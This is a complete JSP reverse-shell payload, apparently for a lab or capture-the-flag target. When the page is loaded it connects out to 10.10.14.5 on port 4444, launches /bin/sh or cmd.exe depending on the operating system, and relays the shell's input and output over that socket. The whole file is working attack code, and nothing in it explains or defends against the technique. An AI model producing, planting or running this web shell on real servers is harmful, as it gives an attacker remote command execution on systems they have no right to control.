<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream pf;
    OutputStream xr;

    StreamConnector( InputStream pf, OutputStream xr )
    {
      this.pf = pf;
      this.xr = xr;
    }

    public void run()
    {
      BufferedReader lk  = null;
      BufferedWriter xbf = null;
      try
      {
        lk  = new BufferedReader( new InputStreamReader( this.pf ) );
        xbf = new BufferedWriter( new OutputStreamWriter( this.xr ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = lk.read( buffer, 0, buffer.length ) ) > 0 )
        {
          xbf.write( buffer, 0, length );
          xbf.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( lk != null )
          lk.close();
        if( xbf != null )
          xbf.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.5", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
